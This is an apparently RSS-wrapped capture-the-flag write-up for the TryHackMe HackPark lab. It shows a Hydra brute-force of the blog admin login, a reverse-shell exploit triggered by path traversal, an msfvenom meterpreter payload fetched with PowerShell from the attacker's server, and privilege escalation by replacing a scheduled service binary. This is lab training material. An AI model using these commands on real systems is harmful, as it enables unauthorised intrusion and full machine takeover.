+&lt;p>&lt;img src="https://raw.githubusercontent.com/Blueaulo/HackPark-writeup-THM/main/f9435039-eb3c-4916-95b0-d0ba6c645332_Export-6a5d592a-f11c-4d5a-b4c1-719215eeb992/HackPark%20633b8e08ffeb4b57aad24df8cd964607/Untitled.png"
+loading="lazy"
+alt="Untitled"
+>&lt;/p>
+&lt;p>From here I can do a reverse image research with google images to uncover the clown identity!&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">hydra -l admin -P /usr/share/wordlists/seclists/Passwords/Leaked-Databases/rockyou.txt &amp;lt;Machine_IP&amp;gt; http-post-form &lt;span class="s2">&amp;#34;/Account/login.aspx?ReturnURL=%2fadmin%2f?ReturnURL=/admin/:__VIEWSTATE=EOQdZQUirRo%2FPUM0GeZEHUCUj2T4rRAdTaQhFI1ySIpm9C8mzxvnNNrRnjAQpjhVlBKOWm1gYZ35tUhQtBunvQ4xbDH%2B0tCVubOn7duj0udoaup%2BbQ5ohSDr%2FkR3znBlND9uVF6IyceARqKMmH7Lr6Ybud38aeXVlK%2FHUbFoRC7QG7j2SmTr2Yo2DP9Z8iuvNgq3V%2F6TWN9zRuY5L41FLVK4aRfYv2wwJyCsYpMBCqqxwwbKVvzuKrxaztrLzQzW7yYMpMYMVupE4S6NoZ%2BI3eAoSEOX9EYCmHNJo7ArRyHf6NaUD4ziHK02Fxf7zNrhsEv6eMLzKY%2FwxcNNYPtZmPZraazfs5Eak1UrAb4bcd%2F5U674&amp;amp;__EVENTVALIDATION=vv0szo0PNWcBRD3S8W58LlYPikRW%2B87zibRx%2F2E7pAtvEDnvbhdcw%2FwUE3c9c3MRswdhWJXJYFE%2Ff4zg9IxkwN13iQf3WP6ILJMuG5mkvCeF1g9rdSkXPBc5%2FKAUY2e4duaTxrTr4klY8YZ4bVhdDhot4KoE7a8pfuEkc1chGV1n%2B4Iv&amp;amp;ctl00%24MainContent%24LoginUser%24UserName=^USER^&amp;amp;ctl00%24MainContent%24LoginUser%24Password=^PASS^&amp;amp;ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed”
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">Hydra v9.5 (c) 2023 by van Hauser/THC &amp;amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-12-28 05:43:08
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">[DATA] attacking http-post-form://10.10.100.75:80/Account/login.aspx?ReturnURL=%2fadmin%2f?ReturnURL=/admin/:__VIEWSTATE=EOQdZQUirRo%2FPUM0GeZEHUCUj2T4rRAdTaQhFI1ySIpm9C8mzxvnNNrRnjAQpjhVlBKOWm1gYZ35tUhQtBunvQ4xbDH%2B0tCVubOn7duj0udoaup%2BbQ5ohSDr%2FkR3znBlND9uVF6IyceARqKMmH7Lr6Ybud38aeXVlK%2FHUbFoRC7QG7j2SmTr2Yo2DP9Z8iuvNgq3V%2F6TWN9zRuY5L41FLVK4aRfYv2wwJyCsYpMBCqqxwwbKVvzuKrxaztrLzQzW7yYMpMYMVupE4S6NoZ%2BI3eAoSEOX9EYCmHNJo7ArRyHf6NaUD4ziHK02Fxf7zNrhsEv6eMLzKY%2FwxcNNYPtZmPZraazfs5Eak1UrAb4bcd%2F5U674&amp;amp;__EVENTVALIDATION=vv0szo0PNWcBRD3S8W58LlYPikRW%2B87zibRx%2F2E7pAtvEDnvbhdcw%2FwUE3c9c3MRswdhWJXJYFE%2Ff4zg9IxkwN13iQf3WP6ILJMuG5mkvCeF1g9rdSkXPBc5%2FKAUY2e4duaTxrTr4klY8YZ4bVhdDhot4KoE7a8pfuEkc1chGV1n%2B4Iv&amp;amp;ctl00%24MainContent%24LoginUser%24UserName=^USER^&amp;amp;ctl00%24MainContent%24LoginUser%24Password=^PASS^&amp;amp;ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">[80][http-post-form] host: 10.10.100.75 login: admin password: &amp;lt;redacted&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">1 of 1 target successfully completed, 1 valid password found
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-12-28 05:44:04
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Found the password!&lt;/p>
+&lt;p>Now we need to get a reverse shell, this can be done by searching in exploit DB using the database version in http://10.10.100.75/admin/about.cshtml&lt;/p>
+&lt;p>After we install the exploit, we need to change the attacker ip and port to ours&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">using&lt;span class="o">(&lt;/span>System.Net.Sockets.TcpClient &lt;span class="nv">client&lt;/span> &lt;span class="o">=&lt;/span> new System.Net.Sockets.TcpClient&lt;span class="o">(&lt;/span>&lt;span class="s2">&amp;#34;&amp;lt;YOUR_IP&amp;gt;&amp;#34;&lt;/span>, &amp;lt;YOUR_PORT&amp;gt;&lt;span class="o">))&lt;/span> &lt;span class="o">{&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Then we rename the file into PostView.ascx&lt;/p>
+&lt;p>After that we set up a listener:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">nc -lvnp &lt;span class="m">4444&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>And we go to publish it&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/Blueaulo/HackPark-writeup-THM/main/f9435039-eb3c-4916-95b0-d0ba6c645332_Export-6a5d592a-f11c-4d5a-b4c1-719215eeb992/HackPark%20633b8e08ffeb4b57aad24df8cd964607/Untitled%201.png"
+loading="lazy"
+alt="Untitled"
+>&lt;/p>
+&lt;p>After that we just want to go to this path: &lt;code>http://10.10.10.10/?theme=../../App_Data/files&lt;/code> for triggering the reverse shell!&lt;/p>
+&lt;p>Now, we want to upgrade the shell using metasploit.&lt;/p>
+&lt;p>First of all we create our revshell:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">msfvenom -p windows/meterpreter/reverse_tcp &lt;span class="nv">LHOST&lt;/span>&lt;span class="o">=&lt;/span>&amp;lt;YOUR_IP&amp;gt; &lt;span class="nv">LPORT&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="m">4555&lt;/span> -f exe -o revshell.exe
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>then we set up our listener inside metasploit:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;span class="lnt">23
+&lt;/span>&lt;span class="lnt">24
+&lt;/span>&lt;span class="lnt">25
+&lt;/span>&lt;span class="lnt">26
+&lt;/span>&lt;span class="lnt">27
+&lt;/span>&lt;span class="lnt">28
+&lt;/span>&lt;span class="lnt">29
+&lt;/span>&lt;span class="lnt">30
+&lt;/span>&lt;span class="lnt">31
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">use exploit/multi/handler
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Using configured payload generic/shell_reverse_tcp
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">msf6 exploit&lt;span class="o">(&lt;/span>multi/handler&lt;span class="o">)&lt;/span> &amp;gt; options
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Module options &lt;span class="o">(&lt;/span>exploit/multi/handler&lt;span class="o">)&lt;/span>:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Name Current Setting Required Description
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ---- --------------- -------- -----------
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Payload options &lt;span class="o">(&lt;/span>generic/shell_reverse_tcp&lt;span class="o">)&lt;/span>:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Name Current Setting Required Description
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ---- --------------- -------- -----------
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> LHOST yes The listen address &lt;span class="o">(&lt;/span>an interface may be specified&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> LPORT &lt;span class="m">4444&lt;/span> yes The listen port
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Exploit target:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Id Name
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> -- ----
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">0&lt;/span> Wildcard Target
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">View the full module info with the info, or info -d command.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">msf6 exploit&lt;span class="o">(&lt;/span>multi/handler&lt;span class="o">)&lt;/span> &amp;gt; &lt;span class="nb">set&lt;/span> LHOST &amp;lt;YOUR_IP&amp;gt;
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">LHOST&lt;/span> &lt;span class="o">=&lt;/span>&amp;gt; &amp;lt;YOUR_IP&amp;gt;
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">msf6 exploit&lt;span class="o">(&lt;/span>multi/handler&lt;span class="o">)&lt;/span> &amp;gt; &lt;span class="nb">set&lt;/span> LPORT &lt;span class="m">4555&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">LPORT&lt;/span> &lt;span class="o">=&lt;/span>&amp;gt; &lt;span class="m">4555&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Then we create a server using python:&lt;/p>
+&lt;p>&lt;code>python3 -m http.server 8000&lt;/code>&lt;/p>
+&lt;p>After that we need to install the reverse shell inside the windows machine,&lt;/p>
+&lt;p>We need to do this inside the &lt;code>temp&lt;/code> folder, otherwise is not going to work:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">powershell Invoke-WebRequest -Uri http://10.18.20.116:8000/revshell.exe -OutFile revshell.exe
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Then we execute the file and we have the shell!&lt;/p>
+&lt;p>now we need to search for the OS, we just need to use &lt;strong>sysinfo&lt;/strong>&lt;/p>
+&lt;p>And for the processes &lt;strong>ps&lt;/strong>&lt;/p>
+&lt;p>The hint tells us to check “C:\Program Files (x86)”&lt;/p>
+&lt;p>So I did:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">c:&lt;span class="se">\P&lt;/span>rogram Files &lt;span class="o">(&lt;/span>x86&lt;span class="o">)&lt;/span>&amp;gt;dir
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Volume in drive C has no label.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Volume Serial Number is 0E97-C552
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Directory of c:&lt;span class="se">\P&lt;/span>rogram Files &lt;span class="o">(&lt;/span>x86&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">08/06/2019 01:12 PM &amp;lt;DIR&amp;gt; .
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">08/06/2019 01:12 PM &amp;lt;DIR&amp;gt; ..
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">08/22/2013 07:39 AM &amp;lt;DIR&amp;gt; Common Files
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">03/21/2014 11:07 AM &amp;lt;DIR&amp;gt; Internet Explorer
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">08/22/2013 07:39 AM &amp;lt;DIR&amp;gt; Microsoft.NET
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">12/28/2023 04:49 AM &amp;lt;DIR&amp;gt; SystemScheduler
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">08/22/2013 07:39 AM &amp;lt;DIR&amp;gt; Windows Mail
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">08/22/2013 07:39 AM &amp;lt;DIR&amp;gt; Windows NT
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">08/22/2013 07:39 AM &amp;lt;DIR&amp;gt; WindowsPowerShell
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">0&lt;/span> File&lt;span class="o">(&lt;/span>s&lt;span class="o">)&lt;/span> &lt;span class="m">0&lt;/span> bytes
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">9&lt;/span> Dir&lt;span class="o">(&lt;/span>s&lt;span class="o">)&lt;/span> 39,124,586,496 bytes free
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>The only thing strange to me is SystemScheduler, if we open the directory, we can see a bunch of processes.&lt;/p>
+&lt;p>Going in the Events, directory, and opening the log file, will reval to us which is the abnormal service that is running.&lt;/p>
+&lt;p>We see that the service Message.exe run with the Administrator privileges, and we can use that in our favor.&lt;/p>
+&lt;p>Now we put in background the meterpreter shell, and then we want to restart the listener again.&lt;/p>
+&lt;p>Next thing to do is, rename the reverse shell in &lt;code>/windows/temp&lt;/code> to Message.exe&lt;/p>
+&lt;p>Then remove Message.exe from the SystemScheduler directory, and put the reverse shell now named Message.exe in it.&lt;/p>
+&lt;p>Now we just need to start the process.&lt;/p>
+&lt;p>(Do this with ./Message.exe or Start-Process “Message.exe”)&lt;/p>
+&lt;p>And we got a Admin shell!&lt;/p>
+&lt;p>Then I found the jeff flag in: &lt;code>C:\Users\Jeff\Desktop\user.txt&lt;/code>&lt;/p>
+&lt;p>And the root flag in: &lt;code>C:\Users\Administrator\Desktop\root.txt&lt;/code>&lt;/p></description></item></channel></rss>
